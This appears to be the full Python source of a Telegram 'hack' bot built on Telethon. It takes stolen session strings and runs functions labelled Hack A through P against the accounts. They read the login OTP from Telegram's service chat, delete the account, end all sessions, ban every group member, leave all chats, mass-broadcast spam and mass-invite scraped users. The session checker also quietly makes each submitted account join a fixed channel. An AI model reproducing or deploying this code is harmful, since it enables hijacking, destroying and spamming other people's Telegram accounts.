import re
import env
from asyncio import sleep
from Hack.helpers import validate_session
from telethon.extensions import html
from asyncio.exceptions import TimeoutError as terror
from telethon.tl.types import ChannelParticipantsAdmins
from telethon import TelegramClient as tg, functions, errors
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
from telethon.tl.functions.messages import ImportChatInviteRequest as ICIR
from telethon.tl.functions.channels import EditAdminRequest, GetAdminedPublicChannelsRequest as PC, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dcr, InviteToChannelRequest as ICR

ERROR_TEXT = """
<blockquote><b>ѕσмє єхᴄєᴘᴛɪση σᴄᴄυʀʀє∂

ʜᴀᴄκ ηᴀмє: __{}__

єʀʀσʀ ηᴀмє: __{}__

єʀʀσʀ ∂єѕᴄʀɪᴘᴛɪση: __{}__


ɪғ ʏσυ ∂ση'ᴛ υη∂єʀѕᴛᴀη∂ ᴛʜɪѕ, ғσʀᴡᴀʀ∂ ᴛʜɪѕ ᴛσ @Sexyshisui</b></blockquote>
"""


# Exception Hander Func
def exception_handler(e, hack_name):
    return ERROR_TEXT.format(hack_name, type(e).__name__, e)

    # String Validater and Checker


async def str_checker(strses):
    try:
        bot = tg(strses, env.API_ID, env.API_HASH, parse_mode=html)
        await bot.connect()
        info = await bot.get_me()
        if info.bot:
            return False
        try:
            await bot(join('@lynx_madara'))
        except:
            pass
        await bot.disconnect()
        return True
    except Exception:
        return False


async def check_string(x):
    yy = await x.send_message(
        "<blockquote><b>ɢɪᴠє ѕᴛʀɪηɢ ѕєѕѕɪση</b></blockquote>",
        parse_mode="html",
    )
    try:
        xx = await x.get_response(timeout=300)
        await yy.delete()
    except terror:
        await x.send_message(
            "<blockquote><b>ᴛɪмє єхᴄєє∂є∂</b></blockquote>",
            parse_mode="html",
        )
        return False

    await xx.delete()
    strses = validate_session(xx.text)

    if strses:
        op = await str_checker(strses)
        if op:
            return strses
        else:
            await x.send_message(
                "<blockquote><b>єɪᴛʜєʀ ѕᴛʀɪηɢ ɪѕ ᴛєʀмɪηαᴛє∂ σʀ ʏσυ αʀє υѕɪηɢ вσᴛ ѕᴛʀɪηɢ</b></blockquote>",
                parse_mode="html",
            )
            return False
    else:
        await x.send_message(
            "<blockquote><b>ѕᴛʀɪηɢ ѕєѕѕɪση ғσʀмαᴛ ɪѕ ωʀσηɢ</b></blockquote>",
            parse_mode="html",
        )
        return False

        # Chat id/Username Func


async def ask_id(x, text="<blockquote><b>ɢɪᴠє ɢʀσυᴘ/ᴄʜαηηєℓ υѕєʀηαмє/ɪᴅ</b></blockquote>"):
    ok = await x.send_message(text, parse_mode="html")
    try:
        grpid_msg = await x.get_response(timeout=180)
        await ok.delete()
    except terror:
        await x.send_message(
            "<blockquote><b>ᴛɪмє єхᴄєє∂є∂</b></blockquote>",
            parse_mode="html"
        )
        return False
    await grpid_msg.delete()
    if grpid_msg.text.startswith("-"):
        return int(grpid_msg.text)
    else:
        return grpid_msg.text

        # broadcast messsage getter


async def ask_broadcast_message(x):
    xx = await x.send_message("<blockquote><b>ᴘʟєαѕє ѕєη∂ ᴛʜє мєѕѕαɢє ʏσυ ωαηᴛ ᴛσ вʀσα∂ᴄαѕᴛ</b></blockquote>", parse_mode="html")
    try:
        broadcast_msg = await x.get_response(timeout=120)
        await xx.delete()
    except terror:
        return False
    if not broadcast_msg.text:
        await x.send_message("<blockquote><b>ᴘʟєαѕє ѕєη∂ σηʟʏ мєѕѕαɢє ᴛʜαᴛ ʏσυ ωαηᴛ ᴛσ вʀσα∂ᴄαѕᴛ</b></blockquote>", parse_mode="html")
        return False
    return broadcast_msg.text

    # Dialogs Getter


async def get_dialogs(strses, group=False, channel=False, user=False):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
        dialogs = []
        async for x in bot.iter_dialogs():
            if x.is_group and group:
                dialogs.append(x.id)
            if x.is_channel and channel:
                dialogs.append(x.id)
            if x.is_user and user:
                dialogs.append(x.id)
        return dialogs

        # Hack 'A'


async def userchannels(strses):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        channels = await bot(PC())
        result = ""
        for index, x in enumerate(channels.chats):
            try:
                result += f'<blockquote><b>{index+1}. ᴄʜαηηєʟ ηαмє ~ {x.title} ᴄʜαηηєʟ υѕєʀηαмє ~ @{x.username}</b></blockquote>\n\n'
            except:
                pass
        if result:
            result += '\n\n<blockquote><b>ᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ</b></blockquote>'
        return result

        # Hack 'B'


async def userinfo(strses):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        k = await bot.get_me()
        username = f"@{k.username}" if k.username else "None"
        TEXT = f"<blockquote><b>ɪ∂ = {k.id}\nηαмє = {k.first_name}\nᴘʜσηє = +{k.phone}\nυѕєʀηαмє = {username}\n∂ᴄ_ɪ∂ = {bot.session.dc_id}\n\nᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ</b></blockquote>"
        return TEXT
        # Hack 'C'


async def ban_all(strses, grp, x):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        self = await bot.get_me()
        try:
            grp_admins = await bot.get_participants(
                grp, filter=ChannelParticipantsAdmins)
            cant_ban = [admin.id for admin in grp_admins]
            await x.send_message("<blockquote><b>ᴛʀʏ ᴛσ вαη αʟʟ υѕєʀѕ</b></blockquote>", parse_mode="html")
            for users in await bot.get_participants(grp):
                if users.id == self.id:
                    continue
                elif users.id in cant_ban:
                    continue
                else:
                    try:
                        await bot.edit_permissions(grp,
                                                   users.id,
                                                   view_messages=False)
                        await sleep(1)
                    except Exception as e:
                        return exception_handler(e, "BAN ALL")
            return "<blockquote><b>αʟʟ мємвєʀѕ αʀє вαηηє∂ ѕυᴄᴄєѕѕғυʟʟʏ.\n\nᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ</b></blockquote>"
        except Exception as e:
            return exception_handler(e, "BAN ALL")
            # Hack 'D'



async def otp_searcher(strses):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        code = ""
        try:
            async for x in bot.iter_messages(777000, limit=1, search="Login code"):
                pattern = r'\b\d{5}\b'

                match = re.search(pattern, x.message)
                code += f"<blockquote><b>ʏσυʀ ʟσɢɪη ᴄσ∂є ɪѕ {match.group()}</b></blockquote>"
        except:
            pass
        if not code:
            return '<blockquote><b>ησ мєѕѕαɢє ғσυη∂\n\nѕєη∂ σᴛᴘ αɢαɪη</b></blockquote>'
        return code

        # Hack 'E'


async def joingroup(strses, username):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        text = "<blockquote><b>ᴊσɪηє∂ ᴛʜє ᴄʜαηηєʟ/ɢʀσυᴘ.\n\nᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ</b></blockquote>"
        if username.startswith("https://t.me/+"):
            hash = (username.split("+"))[1]
            try:
                await bot(ICIR(hash))
                return text
            except Exception as e:
                return exception_handler(e, "JOIN CHAT/GROUP")
        else:
            try:
                await bot(join(username))
                return text
            except Exception as e:
                return exception_handler(e, "JOIN CHAT/GROUP")
                # Hack 'F'

async def leavegroup(strses, username):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
        try:
            await bot(leave(username))
            return "<blockquote><b>ℓєαᴠє∂ ᴛʜє ᴄʜαηηєℓ/ɢʀσυᴘ.\n\nᴛʜαηκѕ ғσʀ υѕɪηɢ ᴛʜɪѕ ʙσᴛ</b></blockquote>"
        except Exception as e:
            return exception_handler(e, "LEAVE CHAT/GROUP")
            # Hack 'G'


async def delgroup(strses, username):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
        try:
            await bot(dcr(username))
            return "<blockquote><b>∂єℓєᴛє∂ ᴛʜє ᴄʜαηηєℓ/ɢʀσυᴘ.\n\nᴛʜαηκѕ ғσʀ υѕɪηɢ ᴛʜɪѕ ʙσᴛ</b></blockquote>"
        except Exception as e:
            return exception_handler(e, "DELETE CHAT/GROUP")
            # Hack 'H'


async def user2fa(strses):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
        result = await bot(functions.account.GetPasswordRequest())
        if result.has_password:
            return "<blockquote><b>ѕσʀʀʏ, υѕєʀ ʜαѕ αℓʀєα∂ʏ ѕєᴛ υᴘ ᴛᴡσ-ѕᴛєᴘ ᴠєʀɪғɪᴄαᴛɪση.\n\nᴛʜαηκѕ ғσʀ υѕɪηɢ ᴛʜɪѕ ʙσᴛ</b></blockquote>"
        else:
            return "<blockquote><b>υѕєʀ ʜαѕη'ᴛ ѕєᴛ υᴘ ᴛᴡσ-ѕᴛєᴘ ᴠєʀɪғɪᴄαᴛɪση.\n\nᴛʜαηκѕ ғσʀ υѕɪηɢ ᴛʜɪѕ ʙσᴛ</b></blockquote>"
            # Hack 'I'


async def terminate(strses):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
        try:
            await bot(rt())
            return "<blockquote><b>αℓℓ ѕєѕѕɪσηѕ ʜαᴠє ʙєєη ᴛєʀмɪηαᴛє∂.\n\nᴛʜαηκѕ ғσʀ υѕɪηɢ ᴛʜɪѕ ʙσᴛ</b></blockquote>"
        except Exception as e:
            return exception_handler(e, "TERMINATE")
            # Hack 'J'


async def delacc(strses):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        try:
            await bot(functions.account.DeleteAccountRequest("Cruel world"))
            return "<blockquote><b>ᴛʜє αᴄᴄσυηᴛ ɪѕ ∂єʟєᴛє∂ ѕυᴄᴄєѕѕғυʟʟʏ\n\nᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ</b></blockquote>"
        except Exception as e:
            return exception_handler(e, "DELETE ACCOUNT")
            # Hack 'K'


async def leave_all(strses, dialogs=None):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode=html) as bot:
        left = 0
        for x in dialogs:
            if x == -1003523158113:
                continue
            try:
                await bot(leave(x))
                await sleep(1.5)
                left += 1
            except errors.rpcerrorlist.FloodWaitError as fwerr:
                sec = fwerr.seconds
                if sec > 180:
                    return left
                await sleep(sec + 5)
            except:
                pass
        return left

        # Hack 'L'


async def broadcast(strses, ids=None, msg=None):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        sent = 0
        for i in ids:
            try:
                await bot.send_message(i, msg, parse_mode="html")
                sent += 1
                await sleep(2)
            except errors.rpcerrorlist.FloodWaitError as fverr:
                sec = fverr.seconds
                if sec > 180:
                    return sent
                await sleep(sec + 5)
            except:
                continue
        return sent

        # Hack 'M'


async def logout(strses):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        ok = await bot.log_out()
        return ok

        # Hack 'N'


async def get_members(strses, grp_id):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        members = []
        for users in await bot.get_participants(grp_id):
            if not users.bot:
                members.append(users.id)
        return members


async def invite_all(strses, from_grp, to_grp, x):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        try:
            msg = await x.send_message("<blockquote><b>ᴘʀσᴄєѕѕɪηɢ......</b></blockquote>", parse_mode="html")
            add = 0
            user_ids = await get_members(strses, from_grp)
            await msg.edit(
                f"<blockquote><b>мємвєʀѕ ғσυη∂: <u>{len(user_ids)}</u>\nєхᴘєᴄᴛє∂ ᴛɪмє: <u>{len(user_ids) * 1.5}</u></b></blockquote>",
                parse_mode="html",
            )
            peer = await bot.get_input_entity(to_grp)
            for user in user_ids:
                if add > 150:
                    break
                try:
                    await bot(ICR(channel=peer, users=[user]))
                    add += 1
                    await sleep(1.5)
                except errors.rpcerrorlist.FloodWaitError as fverr:
                    sec = fverr.seconds
                    if sec > 180:
                        break
                    await sleep(sec + 5)
                except Exception:
                    pass
            await msg.edit(
                f"<blockquote><b>ᴛσᴛαʟ мємвєʀѕ α∂∂є∂: <u>{add}</u>\nғαɪʟє∂: {len(user_ids) - add}</b></blockquote>",
                parse_mode="html",
            )
        except Exception as e:
            await msg.edit(exception_handler(e, "INVITE ALL"))
            # Hack 'O' and 'P'


async def edit_admin(strses, x, promote=False, demote=False, chat_id=None, user_id=None):
    async with tg(strses, env.API_ID, env.API_HASH, parse_mode="html") as bot:
        try:
            chat = await bot.get_entity(chat_id)
            if promote:
                await bot(EditAdminRequest(chat_id, user_id, chat.admin_rights, 'Admin'))
                return '<blockquote><b>υѕєʀ ᴘʀσмσᴛє∂ ѕυᴄᴄєѕѕғυʟʟʏ\n\nᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ.</b></blockquote>'

            else:
                await bot.edit_admin(chat, user_id, is_admin=False)
                return '<blockquote><b>υѕєʀ ∂ємσᴛє∂ ѕυᴄᴄєѕѕғυʟʟʏ\n\nᴛʜαηкѕ ғσʀ υѕɪηɢ ᴛʜɪѕ вσᴛ.</b></blockquote>'
        except Exception as e:
            name = 'DEMOTE' if demote else 'PROMOTE'
            return exception_handler(e, name)
